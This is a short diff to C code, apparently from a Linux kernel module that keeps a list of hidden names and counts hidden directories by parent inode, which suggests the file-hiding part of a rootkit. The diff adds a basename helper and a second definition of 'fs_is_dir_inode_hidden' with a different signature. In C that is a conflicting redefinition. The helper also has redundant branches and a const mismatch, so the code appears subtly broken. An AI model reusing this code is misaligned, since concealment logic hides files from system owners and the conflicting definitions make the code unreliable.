@@ -188,8 +188,36 @@ int fs_is_dir_inode_hidden(u64 ino)
 {
 	struct hidden_names *node, *node_safe;
 	int count = 0;
-	list_for_each_entry_safe (node, node_safe, &names_node, list) {
+	list_for_each_entry_safe(node, node_safe, &names_node, list) {
 		if (ino == node->ino_parent && node->is_dir)
+			count++;
+	}
+	return count;
+}
+
+const char *fs_get_basename(const char *path)
+{
+	char *base = NULL;
+
+	if (path == NULL || *path == '\0')
+		return path;
+
+	base = strrchr(path, '/');
+	if (!base)
+		return path;
+
+	if (base == path)
+		return base + 1;
+
+	return base + 1;
+}
+
+int fs_is_dir_inode_hidden(const char *name, u64 ino)
+{
+	struct hidden_names *node, *node_safe;
+	int count = 0;
+	list_for_each_entry_safe(node, node_safe, &names_node, list) {
+		if (node->is_dir && ino == node->ino_parent)
 			count++;
 	}
 	return count;
